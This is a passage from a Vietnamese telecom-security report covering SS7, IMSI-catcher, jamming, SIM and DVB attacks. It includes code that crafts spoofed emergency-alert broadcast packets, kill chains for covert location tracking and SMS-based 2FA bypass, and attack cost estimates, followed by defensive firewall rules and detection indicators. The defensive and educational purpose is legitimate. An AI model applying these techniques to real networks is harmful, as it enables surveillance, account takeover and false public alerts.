        0x00,               # section_number
        0x00,               # last_section_number
    ]) + descriptor
    
    # Thêm CRC32
    import binascii
    crc = binascii.crc32(section) & 0xFFFFFFFF
    section += struct.pack(">I", crc)
    
    # Đóng gói vào MPEG-TS packet (PID 0x0200 ví dụ)
    ts_header = bytes([0x47, 0x02, 0x00, 0x10])  # sync, PID, payload_unit_start, cc
    payload = section.ljust(184, b'\xFF')[:184]
    return ts_header + payload

# Tạo EWS packet và chèn vào TS stream
ews_packet = create_ews_section("EMERGENCY ALERT: Test message", alert_level=1)
```

---

## 10. Kết Hợp Tấn Công Đa Vector

Trong thực tế nghiên cứu về khả năng tấn công, các kỹ thuật trên thường được kết hợp để đạt hiệu quả cao hơn:

### 10.1 Kill Chain: SS7 + IMSI Catcher

```
Giai đoạn 1 – Trinh sát (SS7):
  SRI → IMSI + MSC address
  PSI → Cell-ID → Vị trí địa lý
  ATI → Lịch trình di chuyển (polling mỗi 5 phút)

Giai đoạn 2 – Tiếp cận vật lý (IMSI Catcher):
  Khi mục tiêu đến khu vực đã biết:
  Fake eNodeB thu hút UE → Xác nhận IMSI → Vị trí chính xác cm

Giai đoạn 3 – Vô hiệu hóa liên lạc (SS7 + Jamming):
  SS7 RegisterSS CFU → Chuyển hướng cuộc gọi
  SS7 CancelLocation → Đẩy UE offline
  Selective Jamming (dự phòng) → Cắt GSM/3G/4G/GPS
```

### 10.2 Kill Chain: 2FA Bypass

```
Giai đoạn 1: Thu thập MSISDN mục tiêu
Giai đoạn 2: SS7 SRI-SM → IMSI + SMSC address
Giai đoạn 3: SS7 ForwardSM hoặc ISD SMSC redirect
Giai đoạn 4: Yêu cầu reset mật khẩu → SMS OTP đến attacker
Giai đoạn 5: Vượt 2FA → chiếm tài khoản
```

---

## 11. So Sánh và Phân Loại

### 11.1 Ma Trận So Sánh Kỹ Thuật

| Kỹ thuật | Lớp tấn công | Yêu cầu gần mục tiêu | Chi phí ước tính | Độ phức tạp | Hiệu quả chống 5G |
|---|---|---|---|---|---|
| SS7 Exploitation | Signalling L7 | Không (remote) | $500–$5,000/tháng (STP access) | Cao | Thấp (5G core tách biệt) |
| Diameter Attack | Signalling L7 | Không (remote) | Tương tự SS7 | Cao | Trung bình (4G core vẫn dùng) |
| IMSI Catcher (GSM) | Radio L1–L2 | Có (100m–2km) | $300–$1,000 (SDR) | Trung bình | Thấp (nếu UE 5G SA) |
| IMSI Catcher (LTE) | Radio L1–L2 | Có (50m–500m) | $700–$2,000 | Cao | Thấp (5G SA) |
| SIM Cloning COMP128 | Physical | Có (vật lý) | $50–$200 | Thấp–Trung | N/A (SIM thế hệ mới) |
| SIM Swap | Social Eng. | Không cần | ~$0 (kỹ năng) | Thấp | Cao (protocol-agnostic) |
| Fake eNodeB | Radio L1–L2 | Có (100m–1km) | $700–$2,000 | Rất cao | Thấp (5G SA) |
| SS7 Call Redirect | Signalling L7 | Không | Như SS7 | Cao | Thấp |
| Selective Jamming | Radio L1 | Có (10m–500m) | $30–$5,000 | Thấp–Cao | Cao (jam là physical) |
| DVB Hijacking | Broadcast RF | Có (khu vực) | $300–$2,000 | Cao | N/A |

### 11.2 Phân Loại Theo Mục Tiêu

```
Mục tiêu: Theo dõi vị trí
  → SS7 PSI/ATI (remote, liên tục)
  → IMSI Catcher (local, chính xác cao)

Mục tiêu: Chặn liên lạc (cuộc gọi/SMS)
  → SS7 ISD + RegisterSS (remote, vô hình)
  → IMSI Catcher Active MITM (local)
  → SIM Cloning (sau khi clone)

Mục tiêu: Vô hiệu hóa liên lạc
  → SS7 CancelLocation + RegisterSS CFNRc (remote)
  → Fake eNodeB DoS mode (local)
  → Selective Jamming (physical, brute force)

Mục tiêu: Chiếm đoạt tài khoản
  → SIM Swap + 2FA bypass
  → SS7 SMS interception + 2FA bypass
```

---

## 12. Cơ Chế Phòng Thủ

### 12.1 Phòng Thủ Chống SS7/Diameter

**Kiến trúc giải pháp:**
```
┌─────────────────────────────────────────────────────────────────┐
│                   SS7 Security Architecture                     │
│                                                                 │
│  External SS7      ┌──────────────────────────────────────┐    │
│  Network    ──────►│         SS7 Firewall / STP           │    │
│                    │                                      │    │
│                    │  Whitelist-based filtering:          │    │
│                    │  ├── Cho phép: SRI từ GT hợp lệ     │    │
│                    │  ├── Chặn: PSI từ GT không rõ       │    │
│                    │  ├── Chặn: ISD từ ngoài mạng        │    │
│                    │  ├── Chặn: RegisterSS từ ngoài      │    │
│                    │  └── Rate limit: SRI > 10/giây/GT   │    │
│                    │                                      │    │
│                    │  Anomaly Detection:                  │    │
│                    │  ├── PSI queries cho IMSI nội mạng  │    │
│                    │  ├── SRI burst patterns              │    │
│                    │  └── GT spoofing indicators          │    │
│                    └──────────────────────────────────────┘    │
│                                   │                            │
│                           Internal Network                     │
└─────────────────────────────────────────────────────────────────┘
```

**Giải pháp thương mại:**
- **Positive Technologies PT TAD**: Phân tích traffic SS7/Diameter theo thời gian thực, ML-based anomaly detection
- **Mobileum RAVEN**: SS7/Diameter security monitoring với threat intelligence
- **GSMA FS.11 compliant firewall**: Triển khai filtering theo khuyến nghị GSMA

**Cấu hình SS7 Firewall rules (mô tả):**
```
ALLOW: MAP SRI từ [danh sách GT nhà mạng partner đã biết]
ALLOW: MAP ISD chỉ từ GT nội mạng
BLOCK: MAP PSI từ mọi GT bên ngoài
BLOCK: MAP RegisterSS từ GT bên ngoài  
BLOCK: MAP CancelLocation từ GT bên ngoài
ALERT: SRI rate > 100 queries/phút từ một GT
ALERT: PSI queries cho subscriber không roaming
```

### 12.2 Phòng Thủ Chống IMSI Catcher

**Phía mạng:**
- **5G NR SUCI (Subscription Concealed Identifier)**: IMSI được mã hóa bằng ECIES trước khi truyền qua air interface, sử dụng public key của HPLMN → IMSI Catcher không thể giải mã IMSI từ tín hiệu vô tuyến
- **Cấm kết nối 2G**: Operators có thể tắt GSM fallback để loại bỏ downgrade attack
- **ARPF (Authentication credential Repository and Processing Function)**: Trong 5G, xác thực lẫn nhau bắt buộc

**Phía người dùng:**
- **AIMSICD (Android IMSI-Catcher Detector)**: Phát hiện dựa trên:
  - Biến động bất thường của cell parameters (LAC, ARFCN)
  - Xuất hiện cell với cùng MCC/MNC nhưng Cell-ID không quen
  - Downgrade từ LTE về GSM đột ngột
  - Giảm RSRP đột ngột sau khi kết nối cell mới
- **CryptoPhone (GSMK)**: Firmware điện thoại tăng cường, hiển thị cảnh báo khi phát hiện indicators

**Chỉ số phát hiện IMSI Catcher (Indicators of Compromise):**
```
1. Cell change đột ngột sang cell có LAC = 0 hoặc LAC lạ
2. Authentication được yêu cầu 2 lần liên tiếp
3. Call encryption disabled (A5/0 indicator)
4. Cell broadcast channel bị tắt (BCC bit)
5. Neighbor cell list trống hoặc chỉ 1 cell
6. Timing advance = 0 (thiết bị ở ngay cạnh "trạm")
```

### 12.3 Phòng Thủ Chống Jamming

| Kỹ thuật phòng thủ | Cơ chế | Hiệu quả |
|---|---|---|
| **FHSS** (Frequency Hopping SS) | Nhảy tần giả ngẫu nhiên ~1600 lần/giây (Bluetooth) | Cao (cần jammer có bandwidth rộng) |
| **DSSS** (Direct Sequence SS) | Trải tín hiệu trên băng thông rộng, processing gain | Cao (cần jammer công suất rất lớn) |
| **Antenna Diversity** | Nhiều ăng-ten hướng khác nhau, chuyển ăng-ten | Trung bình (nếu jammer không directional) |
| **Adaptive Modulation** | Giảm MCS khi SNR thấp (từ 64QAM về QPSK) | Thấp (chỉ kéo dài thời gian, không chặn hoàn toàn) |
| **Cognitive Radio** | Tự động phát hiện và di chuyển sang kênh sạch | Cao (nếu phổ tần dự phòng có sẵn) |
| **RF Monitoring** | Spectrum analyzer phát hiện jamming signal | Phát hiện được nhưng không ngăn chặn |

### 12.4 Phòng Thủ Chống SIM Cloning

- **Upgrade lên USIM (UMTS SIM)**: MILENAGE + mutual authentication → COMP128v1 không còn áp dụng
- **Chính sách SIM Swap nghiêm ngặt**: Yêu cầu 2 hình thức xác minh; gửi OTP qua email trước khi swap; delay 24h; thông báo SMS/email cho chủ tài khoản
- **Number Portability with SIM binding**: Liên kết SIM ICCID với số điện thoại, yêu cầu xác minh cả ICCID khi swap
- **App-based 2FA thay SMS**: TOTP (Google Authenticator, FIDO2) không bị ảnh hưởng bởi SS7/SIM swap

---

## 13. Kết Luận

Phân tích chi tiết trong báo cáo này cho thấy hạ tầng mạng di động toàn cầu tồn tại một chuỗi lỗ hổng có hệ thống, bắt nguồn từ ba vấn đề cơ bản:

**1. Thiết kế giao thức trong thời kỳ pre-security**: SS7 (1975) và ngay cả Diameter (2003) được thiết kế trong mô hình mạng đóng, tin tưởng lẫn nhau hoàn toàn. Khi Internet kết nối các mạng này lại, mô hình tin tưởng đó trở thành lỗ hổng nghiêm trọng.

**2. Tính mở của phổ vô tuyến**: Giao diện không dây là kênh chia sẻ vật lý, không có ranh giới phân chia cứng như cáp quang. Bất kỳ thiết bị phát sóng nào đủ mạnh đều có thể can thiệp.

**3. Tốc độ nâng cấp hạ tầng chậm**: Thế giới vẫn đang vận hành song song 2G/3G/4G/5G, tạo ra attack surface từ tất cả thế hệ cũ.

**Xu hướng phòng thủ**:
- **5G NR SA (Standalone)** với SUCI, mutual authentication, và core network tách biệt khỏi SS7 giải quyết một phần lớn vấn đề, nhưng quá trình chuyển đổi toàn cầu sẽ mất nhiều thập kỷ
- **Telecom Security Operations Center (T-SOC)** với real-time SS7/Diameter monitoring đang trở thành tiêu chuẩn tại các nhà mạng lớn
- **Zero-trust signalling**: Mọi lệnh MAP/Diameter đều được xác minh origin trước khi thực thi

Nghiên cứu và hiểu biết về các kỹ thuật này là nền tảng bắt buộc cho:
- Thiết kế và kiểm thử an toàn hệ thống viễn thông (telecom security assessment)
- Phát triển hệ thống phát hiện xâm nhập cho mạng signalling
- Hoạch định chính sách bảo mật viễn thông quốc gia
- Nghiên cứu và phát triển các thế hệ giao thức an toàn hơn

---

## 14. Tài Liệu Tham Khảo

### Bài Báo Học Thuật và Hội Thảo

1. Engel, T. (2014). *SS7: Locate. Track. Manipulate*. 31st Chaos Communication Congress (31C3). CCC, Hamburg.
2. Nohl, K., Melette, L., & Münch, H. (2014). *Mobile self-defense*. 31C3. CCC, Hamburg.
3. Golde, N., Redon, K., & Borgaonkar, R. (2013). *Weaponizing femtocells: The effect of rogue devices on mobile telecommunication*. NDSS Symposium.
4. Dabrowski, A., Pianta, N., Klepp, T., Huber, M., & Weippl, E. (2014). *IMSI-Catch Me If You Can: IMSI-Catcher-Catchers*. ACSAC 2014.
5. Shaik, A., Borgaonkar, R., Asokan, N., Niemi, V., & Seifert, J. P. (2015). *Practical attacks against privacy and availability in 4G/LTE mobile communication systems*. NDSS 2016.
6. Rupprecht, D., Kohls, K., Holz, T., & Pöpper, C. (2019). *Breaking LTE on Layer Two*. IEEE S&P 2019.
7. Bitsikas, E., & Pöpper, C. (2021). *Don't hand it over: Vulnerabilities in the handover procedure of cellular telecommunications*. ACSAC 2021.
8. Hussain, S. R., Echeverria, M., Chowdhury, O., Li, N., & Bertino, E. (2019). *Privacy attacks to the 4G and 5G cellular paging protocols using side channel information*. NDSS 2019.

### Tài Liệu Kỹ Thuật Tiêu Chuẩn

9. 3GPP TS 29.002 v17.x. *Mobile Application Part (MAP) specification*. 3rd Generation Partnership Project.
10. 3GPP TS 29.272 v17.x. *MME and SGSN related interfaces based on Diameter protocol*. 3GPP.
11. 3GPP TS 33.401 v17.x. *3GPP System Architecture Evolution (SAE): Security architecture*. 3GPP.
12. 3GPP TS 33.501 v17.x. *Security architecture and procedures for 5G System*. 3GPP.
13. ITU-T Q.700–Q.716. *Specifications of Signalling System No. 7*. ITU Telecommunication Standardization Sector.
14. RFC 6733. *Diameter Base Protocol*. IETF, 2012.
15. GSMA FS.11 v4.0. *SS7 and SIGTRAN Network Security*. GSMA, 2020.
16. GSMA FS.19 v2.0. *Diameter Interconnect Security*. GSMA, 2022.
17. GSMA IR.82. *SS7 Security Implementation*. GSMA.

### Báo Cáo Kỹ Thuật Ngành

18. Positive Technologies. (2018). *Vulnerability analysis of SS7 and Diameter signalling networks*. Positive Technologies Technical Report.
19. Positive Technologies. (2020). *Telecom security assessment: SS7 networks*. Annual Report.
20. ETSI EN 302 755 v1.4.1. *Digital Video Broadcasting (DVB); DVB-T2: Second generation framing, channel coding and modulation systems for broadcasting*. ETSI.
21. NIST SP 800-187. *Guide to LTE Security*. National Institute of Standards and Technology, 2017.

### Phần Mềm và Công Cụ Mã Nguồn Mở

22. SigPloiter. *SigPloit – Telecom Signaling Exploitation Framework*. GitHub: github.com/SigPloiter/SigPloit
23. Software Radio Systems. *srsRAN 4G Documentation*. srs.io, 2021.
24. OpenBTS Project. *OpenBTS: Open Source GSM Base Station*. Range Networks.
25. EURECOM. *OpenAirInterface5G: Open Source LTE/5G Software*. gitlab.eurecom.fr/oai/openairinterface5g
26. The GNU Radio Project. *GNU Radio Documentation*. gnuradio.org, 2024.
27. Ferraris, D. *gr-dvbt2: DVB-T2 transmitter in GNU Radio*. GitHub: github.com/drmpeg/gr-dvbt2
28. Pycrate Library. *pycrate: A software suite for parsing and crafting network protocols*. GitHub: github.com/P1sec/pycrate

---

*Báo cáo này được biên soạn cho mục đích nghiên cứu và giáo dục chuyên ngành an toàn thông tin viễn thông. Các kỹ thuật mô tả được ghi nhận trong tài liệu học thuật quốc tế và hội thảo bảo mật uy tín. Việc ứng dụng ngoài môi trường được ủy quyền hợp pháp (authorized penetration testing, nghiên cứu có kiểm soát, môi trường lab riêng biệt) có thể vi phạm Điều 224–226 Bộ luật Hình sự Việt Nam về tội phạm máy tính và viễn thông, cũng như các điều khoản tương đương tại các quốc gia khác.*
